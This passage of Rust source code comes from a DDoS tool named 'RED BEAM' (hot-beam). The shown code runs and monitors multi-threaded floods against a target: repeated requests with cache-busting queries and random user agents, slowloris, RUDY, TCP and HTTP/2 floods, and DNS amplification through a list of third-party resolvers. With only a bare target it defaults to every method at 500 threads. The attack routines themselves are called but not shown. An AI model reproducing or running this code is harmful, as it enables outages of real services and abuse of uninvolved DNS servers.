// ---------------------------------------------------------------------------
async fn attack_repeat_worker(
    client: &Client,
    endpoints: &[String],
    method: &str,
    headers: &HashMap<String, String>,
    body_template: &Option<String>,
    stats: &Stats,
    stop: &AtomicBool,
    seq: &AtomicU64,
    rand_query: bool,
) {
    while !stop.load(Ordering::Relaxed) {
        let seq_id = seq.fetch_add(1, Ordering::Relaxed);
        let target_url = {
            let idx = seq_id as usize % endpoints.len();
            let mut url = endpoints[idx].clone();
            if rand_query {
                let sep = if url.contains('?') { "&" } else { "?" };
                url = format!("{}{}_cb={}", url, sep, rand_str(8));
            }
            url
        };

        let rendered_body = body_template.as_ref().map(|b| render_template(b, seq_id));
        let body_len = rendered_body.as_ref().map_or(0, |b| b.len() as u64);

        let mut req = match method {
            "POST" => client.post(&target_url), "PUT" => client.put(&target_url),
            "DELETE" => client.delete(&target_url), "PATCH" => client.patch(&target_url),
            "HEAD" => client.head(&target_url), _ => client.get(&target_url),
        };
        for (k, v) in headers { req = req.header(k.as_str(), v.as_str()); }
        if !headers.contains_key("User-Agent") && !headers.contains_key("user-agent") {
            req = req.header("user-agent", rand_ua());
        }
        if let Some(ref body) = rendered_body { req = req.body(body.clone()); }

        match req.timeout(Duration::from_secs(5)).send().await {
            Ok(resp) => { stats.hit_sent(body_len); stats.hit_status(resp.status().as_u16()); }
            Err(_) => stats.hit_attempted(),
        }
    }
}

// ---------------------------------------------------------------------------
// Display
// ---------------------------------------------------------------------------
fn display_stats(stats: &Stats, target: &str, method: &str, threads: usize, duration: u64, elapsed: f64, extra: &str) {
    let total = stats.total_attempted.load(Ordering::Relaxed);
    let wire = stats.total_wire_sent.load(Ordering::Relaxed);
    let success = stats.total_success.load(Ordering::Relaxed);
    let fail = stats.total_fail.load(Ordering::Relaxed);
    let bytes = stats.bytes_sent.load(Ordering::Relaxed);
    let rps = stats.current_rps.load(Ordering::Relaxed);
    let wire_rps = stats.current_wire_rps.load(Ordering::Relaxed);
    let peak = stats.peak_rps.load(Ordering::Relaxed);
    let wire_peak = stats.peak_wire_rps.load(Ordering::Relaxed);
    let avg = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
    let wire_avg = if elapsed > 0.0 { wire as f64 / elapsed } else { 0.0 };
    let remaining = if duration as f64 > elapsed { duration as f64 - elapsed } else { 0.0 };
    let pct = (elapsed / duration as f64 * 100.0).min(100.0);
    let bw = 30; let filled = (bw as f64 * pct / 100.0) as usize;
    let bar = format!("{}{}", "█".repeat(filled), "░".repeat(bw - filled));
    print!("\x1B[2J\x1B[1;1H");
    println!("{}", "╭───────────────────────────── ⚡ RED BEAM ⚡ ─────────────────────────────╮".red().bold());
    println!("│{:74}│", "");
    println!("│  {:<16} {:<56}│", "Target".cyan().bold(), target.yellow().bold());
    println!("│  {:<16} {:<56}│", "Method".cyan().bold(), method.magenta().bold());
    if !extra.is_empty() {
        let e = if extra.len() > 56 { &extra[..56] } else { extra };
        println!("│  {:<16} {:<56}│", "Request".cyan().bold(), e);
    }
    println!("│  {:<16} {:<56}│", "Threads".cyan().bold(), format!("{}", threads));
    println!("│  {:<16} {:<56}│", "Duration".cyan().bold(), format!("{:.0}s / {}s  ({:.0}s left)", elapsed, duration, remaining));
    println!("│{:74}│", "");
    println!("│  {:<16} {:<56}│", "Network RPS".cyan().bold(), format!("{}", wire_rps).green().bold());
    println!("│  {:<16} {:<56}│", "Attempted RPS".cyan().bold(), format!("{}", rps));
    println!("│  {:<16} {:<56}│", "Peak Net RPS".cyan().bold(), format!("{}", wire_peak).green().bold());
    println!("│  {:<16} {:<56}│", "Peak Att RPS".cyan().bold(), format!("{}", peak));
    println!("│  {:<16} {:<56}│", "Avg Net RPS".cyan().bold(), format!("{:.0}", wire_avg).bold());
    println!("│  {:<16} {:<56}│", "Avg Att RPS".cyan().bold(), format!("{:.0}", avg));
    println!("│{:74}│", "");
    println!("│  {:<16} {:<56}│", "Wire Sent".cyan().bold(), format!("{}", wire).bold());
    println!("│  {:<16} {:<56}│", "Attempted".cyan().bold(), format!("{}", total));
    println!("│  {:<16} {:<56}│", "Success".cyan().bold(), format!("{}", success).green());
    println!("│  {:<16} {:<56}│", "Failed".cyan().bold(), format!("{}", fail).red());
    let s2 = stats.status_2xx.load(Ordering::Relaxed);
    let s3 = stats.status_3xx.load(Ordering::Relaxed);
    let s4 = stats.status_4xx.load(Ordering::Relaxed);
    let s5 = stats.status_5xx.load(Ordering::Relaxed);
    if s2 + s3 + s4 + s5 > 0 {
        println!("│  {:<16} {:<56}│", "Status".cyan().bold(), format!("2xx:{} 3xx:{} 4xx:{} 5xx:{}", s2, s3, s4, s5));
    }
    println!("│  {:<16} {:<56}│", "Data Sent".cyan().bold(), format!("{:.1} MB", bytes as f64 / 1024.0 / 1024.0));
    println!("│{:74}│", "");
    println!("│  {:<16} {} {:.0}%{:width$}│", "Progress".cyan().bold(), bar, pct, "", width = 56 - bw - 5);
    println!("│{:74}│", "");
    println!("{}", "╰──────────────────────────────────────────────────────────────────────────╯".red().bold());
}

fn print_json_result(stats: &Stats, elapsed: f64) {
    let total = stats.total_attempted.load(Ordering::Relaxed);
    let wire = stats.total_wire_sent.load(Ordering::Relaxed);
    let success = stats.total_success.load(Ordering::Relaxed);
    let fail = stats.total_fail.load(Ordering::Relaxed);
    let bytes = stats.bytes_sent.load(Ordering::Relaxed);
    let peak = stats.peak_rps.load(Ordering::Relaxed);
    let wire_peak = stats.peak_wire_rps.load(Ordering::Relaxed);
    let avg = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
    let wire_avg = if elapsed > 0.0 { wire as f64 / elapsed } else { 0.0 };
    let s2 = stats.status_2xx.load(Ordering::Relaxed);
    let s4 = stats.status_4xx.load(Ordering::Relaxed);
    let s5 = stats.status_5xx.load(Ordering::Relaxed);
    println!(r#"{{"total_attempted":{},"wire_sent":{},"success":{},"failed":{},"bytes":{},"elapsed":{:.2},"avg_rps":{:.0},"avg_wire_rps":{:.0},"peak_rps":{},"peak_wire_rps":{},"status_2xx":{},"status_4xx":{},"status_5xx":{}}}"#,
        total, wire, success, fail, bytes, elapsed, avg, wire_avg, peak, wire_peak, s2, s4, s5);
}

fn print_summary(stats: &Stats, elapsed: f64) {
    let total = stats.total_attempted.load(Ordering::Relaxed);
    let wire = stats.total_wire_sent.load(Ordering::Relaxed);
    let success = stats.total_success.load(Ordering::Relaxed);
    let fail = stats.total_fail.load(Ordering::Relaxed);
    let bytes = stats.bytes_sent.load(Ordering::Relaxed);
    let peak = stats.peak_rps.load(Ordering::Relaxed);
    let wire_peak = stats.peak_wire_rps.load(Ordering::Relaxed);
    let avg = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
    let wire_avg = if elapsed > 0.0 { wire as f64 / elapsed } else { 0.0 };
    println!("\n{}", "⚡ BEAM COMPLETE".red().bold());
    println!("{}", "─".repeat(45).dimmed());
    println!("  Wire Sent:  {} requests", format!("{}", wire).green().bold());
    println!("  Attempted:  {} requests", format!("{}", total).bold());
    println!("  Success:    {}", format!("{}", success).green());
    println!("  Failed:     {}", format!("{}", fail).red());
    let s2 = stats.status_2xx.load(Ordering::Relaxed);
    let s3 = stats.status_3xx.load(Ordering::Relaxed);
    let s4 = stats.status_4xx.load(Ordering::Relaxed);
    let s5 = stats.status_5xx.load(Ordering::Relaxed);
    if s2 + s3 + s4 + s5 > 0 {
        println!("  Status:     2xx:{} 3xx:{} 4xx:{} 5xx:{}", format!("{}", s2).green(), s3, format!("{}", s4).yellow(), format!("{}", s5).red());
    }
    println!("  Data:       {:.1} MB", bytes as f64 / 1024.0 / 1024.0);
    println!("  Duration:   {:.1}s", elapsed);
    println!("  Net RPS:    {:.0} (peak: {})", wire_avg, wire_peak);
    println!("  Att RPS:    {:.0} (peak: {})", avg, peak);
    println!("{}", "─".repeat(45).dimmed());
}

// ---------------------------------------------------------------------------
// Recon helper
// ---------------------------------------------------------------------------
async fn do_recon(target: &str) {
    eprintln!("\n{}", "⚡ RED BEAM - Target Recon".cyan().bold());
    eprintln!("{}", "─".repeat(45).dimmed());
    let parsed = url::Url::parse(target).unwrap();
    let host = parsed.host_str().unwrap_or("");
    let port = parsed.port().unwrap_or(443);
    match tokio::net::lookup_host(format!("{}:{}", host, port)).await {
        Ok(mut addrs) => { if let Some(a) = addrs.next() { eprintln!("  Host:     {} ({})", host.yellow(), a.ip()); } }
        Err(_) => { eprintln!("  {}", "Cannot resolve target".red()); std::process::exit(1); }
    }
    match reqwest::Client::builder().danger_accept_invalid_certs(true).timeout(Duration::from_secs(5)).build().unwrap().head(target).send().await {
        Ok(resp) => {
            let srv = resp.headers().get("server").and_then(|v| v.to_str().ok()).unwrap_or("(hidden)");
            eprintln!("  Server:   {}", srv.yellow());
            eprintln!("  Status:   {}", format!("{}", resp.status().as_u16()).green());
        }
        Err(e) => eprintln!("  HTTP:     {}", format!("Failed ({})", e).red()),
    }
    eprintln!("{}\n", "─".repeat(45).dimmed());
}

fn build_client(threads: usize) -> Client {
    reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(threads)
        .pool_idle_timeout(Duration::from_secs(30))
        .tcp_keepalive(Duration::from_secs(30))
        .tcp_nodelay(true)
        .connect_timeout(Duration::from_secs(2))
        .timeout(Duration::from_secs(5))
        .redirect(reqwest::redirect::Policy::none())
        .no_gzip().no_brotli().no_deflate()
        .build().unwrap()
}

fn build_client_pool(threads: usize) -> Vec<Client> {
    let pool_count = std::cmp::max(1, threads / 50);
    let per_pool = std::cmp::max(50, threads / pool_count);
    (0..pool_count).map(|_| {
        reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .pool_max_idle_per_host(per_pool)
            .pool_idle_timeout(Duration::from_secs(30))
            .tcp_keepalive(Duration::from_secs(30))
            .tcp_nodelay(true)
            .connect_timeout(Duration::from_secs(2))
            .timeout(Duration::from_secs(5))
            .redirect(reqwest::redirect::Policy::none())
            .no_gzip().no_brotli().no_deflate()
            .build().unwrap()
    }).collect()
}

// ---------------------------------------------------------------------------
// Fire entrypoint
// ---------------------------------------------------------------------------
async fn run_fire(args: FireArgs) {
    let target = if args.target.contains("://") { args.target.clone() } else { format!("https://{}", args.target) };

    tune_os_params();

    let tmpl = if args.method == AttackMethod::Repeat {
        Some(Arc::new(RequestTemplate::from_fire_args(&args, &target)))
    } else { None };

    let dns_resolvers: Arc<Vec<std::net::SocketAddr>> = if args.method == AttackMethod::DnsAmp || args.method == AttackMethod::All {
        let slave_path = args.dns_slaves.clone().or_else(|| {
            for c in &["dns_slaves.txt", "hot_beam_rs/dns_slaves.txt"] {
                if std::path::Path::new(c).exists() { return Some(c.to_string()); }
            }
            None
        });
        if let Some(path) = slave_path {
            let resolvers = load_dns_slaves(&path);
            if !args.json { eprintln!("  {} Loaded {} DNS resolvers from {}", "✓".green(), resolvers.len(), path); }
            Arc::new(resolvers)
        } else if args.method == AttackMethod::DnsAmp {
            eprintln!("  {} dns-amp requires --dns-slaves <file>", "✗".red()); std::process::exit(1);
        } else {
            if !args.json { eprintln!("  {} No dns_slaves.txt found, skipping dns-amp layer", "⚠".yellow()); }
            Arc::new(Vec::new())
        }
    } else { Arc::new(Vec::new()) };

    if !args.no_recon && !args.json {
        do_recon(&target).await;
        if let Some(ref t) = tmpl { eprintln!("  Request:  {}", t.display_info().cyan()); }
    }

    let (host, port, is_tls) = parse_host_port(&target);

    let tls_connector = Arc::new(make_tls_connector());

    let flood_payloads: Arc<Vec<Vec<u8>>> = if args.method == AttackMethod::Flood || args.method == AttackMethod::All {
        if !args.json { eprintln!("  {} Pre-generating {} flood payloads ({}x pipeline)...", "⚡".yellow(), FLOOD_PAYLOAD_COUNT, FLOOD_PIPELINE_DEPTH); }
        Arc::new(generate_flood_payloads(&host, is_tls))
    } else { Arc::new(Vec::new()) };

    let stats = Arc::new(Stats::new());
    let stop = Arc::new(AtomicBool::new(false));
    let method_str = format!("{}", args.method);
    let extra_info = tmpl.as_ref().map_or(String::new(), |t| t.display_info());

    if !args.json {
        eprintln!("{} {} {} | {} | {} threads | {}s", "⚡".red(), "Firing RED BEAM at".red().bold(),
            target.yellow().bold(), method_str.magenta(), args.threads, args.duration);
        if let Some(ref t) = tmpl { eprintln!("  {}\n", t.display_info().cyan()); }
    }

    let clients = build_client_pool(args.threads);
    let clients = Arc::new(clients);

    let methods: Vec<AttackMethod> = match args.method {
        AttackMethod::All => {
            let mut m = vec![AttackMethod::Flood, AttackMethod::Bypass, AttackMethod::Slowloris, AttackMethod::Rudy, AttackMethod::Tcp, AttackMethod::H2flood];
            if !dns_resolvers.is_empty() { m.push(AttackMethod::DnsAmp); }
            m
        }
        m => vec![m],
    };

    let start = Instant::now();
    let tpm = std::cmp::max(1, args.threads / methods.len());

    for m in &methods {
        for i in 0..tpm {
            let client = clients[i % clients.len()].clone();
            let target = target.clone(); let stats = stats.clone();
            let stop = stop.clone(); let tmpl = tmpl.clone(); let resolvers = dns_resolvers.clone();
            let psize = args.packet_size; let delay = args.packet_delay;
            let dur = Duration::from_secs(args.duration); let method = *m;
            let tls_conn = tls_connector.clone();
            let payloads = flood_payloads.clone();
            let host = host.clone();
            tokio::spawn(async move {
                let deadline = Instant::now() + dur;
                let target_ip = url::Url::parse(&target).ok().and_then(|u| u.host_str().map(|s| s.to_string())).unwrap_or_default();
                loop {
                    if stop.load(Ordering::Relaxed) || Instant::now() >= deadline { break; }
                    match method {
                        AttackMethod::Flood => attack_raw_flood(&host, port, is_tls, &tls_conn, &payloads, &stats).await,
                        AttackMethod::Bypass => attack_http_bypass(&client, &target, &stats).await,
                        AttackMethod::Repeat => { if let Some(ref t) = tmpl { attack_fire_repeat(&client, &target, &stats, t).await; } }
                        AttackMethod::Slowloris => { attack_slowloris(&target, &stats, &stop, delay, &tls_conn).await; break; }
                        AttackMethod::Rudy => { attack_rudy(&target, &stats, &stop, delay, &tls_conn).await; break; }
                        AttackMethod::Tcp => attack_tcp_flood(&target, &stats, psize).await,
                        AttackMethod::H2flood => attack_h2_flood(&target, &stats, &tls_conn).await,
                        AttackMethod::DnsAmp => attack_dns_amp(&resolvers, &stats, &target_ip).await,
                        AttackMethod::All => unreachable!(),
                    }
                }
            });
        }
    }

    let stats_d = stats.clone(); let stop_d = stop.clone(); let target_d = target.clone();
    let method_d = method_str.clone(); let extra_d = extra_info.clone(); let json_mode = args.json;
    let threads_c = args.threads; let duration_c = args.duration;
    let display_handle = tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(1)).await;
            if stop_d.load(Ordering::Relaxed) { break; }
            stats_d.snapshot_rps();
            if !json_mode { display_stats(&stats_d, &target_d, &method_d, threads_c, duration_c, start.elapsed().as_secs_f64(), &extra_d); }
        }
    });

    tokio::time::sleep(Duration::from_secs(args.duration)).await;
    stop.store(true, Ordering::Relaxed);
    tokio::time::sleep(Duration::from_millis(500)).await;
    display_handle.abort();
    let elapsed = start.elapsed().as_secs_f64();
    stats.snapshot_rps();
    if args.json { print_json_result(&stats, elapsed); }
    else {
        print!("\x1B[2J\x1B[1;1H");
        display_stats(&stats, &target, &method_str, args.threads, args.duration, elapsed, &extra_info);
        print_summary(&stats, elapsed);
    }
}

// ---------------------------------------------------------------------------
// Repeat entrypoint
// ---------------------------------------------------------------------------
async fn run_repeat(args: RepeatArgs) {
    let target = if args.target.contains("://") { args.target.clone() } else { format!("https://{}", args.target) };
    let method = args.http_method.to_uppercase();

    tune_os_params();

    let mut headers = HashMap::new();
    let mut body_template: Option<String> = None;

    if let Some(ref file) = args.req_file {
        let content = std::fs::read_to_string(file).unwrap_or_else(|e| { eprintln!("Cannot read {}: {}", file, e); std::process::exit(1); });
        let mut lines = content.lines();
        let _first = lines.next();
        let mut in_body = false;
        let mut body_lines = Vec::new();
        for line in lines {
            if in_body { body_lines.push(line); }
            else if line.is_empty() { in_body = true; }
            else if let Some(pos) = line.find(':') {
                headers.insert(line[..pos].trim().to_string(), line[pos + 1..].trim().to_string());
            }
        }
        if !body_lines.is_empty() { body_template = Some(body_lines.join("\n")); }
    }

    for h in &args.headers {
        if let Some(pos) = h.find(':') {
            headers.insert(h[..pos].trim().to_string(), h[pos + 1..].trim().to_string());
        }
    }

    if let Some(ref bf) = args.body_file {
        body_template = Some(std::fs::read_to_string(bf).unwrap_or_else(|e| { eprintln!("Cannot read {}: {}", bf, e); std::process::exit(1); }));
    } else if let Some(ref b) = args.body {
        body_template = Some(b.clone());
    }

    let mut endpoints = vec![target.clone()];
    for e in &args.endpoints { endpoints.push(if e.contains("://") { e.clone() } else { format!("https://{}", e) }); }

    if args.dry_run {
        eprintln!("\n{} Sending 1 request to {}\n", "DRY RUN".cyan().bold(), target.yellow());
        let rendered = body_template.as_ref().map(|b| render_template(b, 0));
        eprintln!("  {} {}", method.bold(), target);
        for (k, v) in &headers { eprintln!("  {}: {}", k.cyan(), v); }
        if let Some(ref body) = rendered {
            let display = if body.len() > 2000 { &body[..2000] } else { body.as_str() };
            eprintln!("\n{}\n{}\n", "Body:".bold(), display);
        }
        let client = build_client(1);
        let mut req = match method.as_str() {
            "POST" => client.post(&target), "PUT" => client.put(&target),
            "DELETE" => client.delete(&target), "PATCH" => client.patch(&target),
            _ => client.get(&target),
        };
        for (k, v) in &headers { req = req.header(k.as_str(), v.as_str()); }
        if let Some(ref body) = rendered { req = req.body(body.clone()); }
        match req.send().await {
            Ok(resp) => {
                eprintln!("{} {}", "Response:".bold(), resp.status());
                for (k, v) in resp.headers() { eprintln!("  {}: {}", format!("{}", k).dimmed(), v.to_str().unwrap_or("")); }
                match resp.text().await {
                    Ok(text) => {
                        let display = if text.len() > 2000 { &text[..2000] } else { &text };
                        eprintln!("\n{}\n{}", "Body:".bold(), display);
                    }
                    Err(e) => eprintln!("  Read error: {}", e),
                }
            }
            Err(e) => eprintln!("{} {}", "Error:".red(), e),
        }
        return;
    }

    if !args.no_recon && !args.json { do_recon(&target).await; }

    let method_label = format!("REPEAT {}", method);
    let extra = format!("{} | {} endpoints | body: {}", method, endpoints.len(),
        body_template.as_ref().map_or("(none)".to_string(), |b| if b.len() > 40 { format!("{}...", &b[..40]) } else { b.clone() }));

    if !args.json {
        eprintln!("{} {} {} | {} | {} threads | {}s", "⚡".red(), "RED BEAM REPEAT at".red().bold(),
            target.yellow().bold(), method.magenta(), args.threads, args.duration);
        if endpoints.len() > 1 { eprintln!("  Endpoints: {} (round-robin)", endpoints.len()); }
        eprintln!();
    }

    let clients = build_client_pool(args.threads);
    let clients = Arc::new(clients);
    let stats = Arc::new(Stats::new());
    let stop = Arc::new(AtomicBool::new(false));
    let seq = Arc::new(AtomicU64::new(0));
    let endpoints = Arc::new(endpoints);
    let headers = Arc::new(headers);
    let body_template = Arc::new(body_template);

    let start = Instant::now();

    for i in 0..args.threads {
        let client = clients[i % clients.len()].clone();
        let endpoints = endpoints.clone(); let method = method.clone();
        let headers = headers.clone(); let body_template = body_template.clone();
        let stats = stats.clone(); let stop = stop.clone(); let seq = seq.clone();
        let dur = Duration::from_secs(args.duration); let rq = args.rand_query;
        tokio::spawn(async move {
            let deadline = Instant::now() + dur;
            while !stop.load(Ordering::Relaxed) && Instant::now() < deadline {
                attack_repeat_worker(&client, &endpoints, &method, &headers, &body_template, &stats, &stop, &seq, rq).await;
            }
        });
    }

    let stats_d = stats.clone(); let stop_d = stop.clone(); let target_d = target.clone();
    let method_d = method_label.clone(); let extra_d = extra.clone(); let json_mode = args.json;
    let threads_c = args.threads; let duration_c = args.duration;
    let display_handle = tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(1)).await;
            if stop_d.load(Ordering::Relaxed) { break; }
            stats_d.snapshot_rps();
            if !json_mode { display_stats(&stats_d, &target_d, &method_d, threads_c, duration_c, start.elapsed().as_secs_f64(), &extra_d); }
        }
    });

    tokio::time::sleep(Duration::from_secs(args.duration)).await;
    stop.store(true, Ordering::Relaxed);
    tokio::time::sleep(Duration::from_millis(500)).await;
    display_handle.abort();
    let elapsed = start.elapsed().as_secs_f64();
    stats.snapshot_rps();
    if args.json { print_json_result(&stats, elapsed); }
    else {
        print!("\x1B[2J\x1B[1;1H");
        display_stats(&stats, &target, &method_label, args.threads, args.duration, elapsed, &extra);
        print_summary(&stats, elapsed);
    }
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
#[tokio::main]
async fn main() {
    let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();

    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Fire(args)) => run_fire(args).await,
        Some(Commands::Repeat(args)) => run_repeat(args).await,
        None => {
            if let Some(target) = cli.bare_target {
                run_fire(FireArgs {
                    target,
                    method: AttackMethod::All,
                    threads: 500,
                    duration: 120,
                    packet_size: 512,
                    packet_delay: 500,
                    dns_slaves: None,
                    no_recon: false,
                    json: false,
                    request_method: None,
                    headers: vec![],
                    body: None,
                    body_file: None,
                    req_file: None,
                    req_path: None,
                    rand_query: false,
                }).await;
            } else {
                Cli::parse_from(&["hot-beam", "--help"]);
            }
        }
    }
}
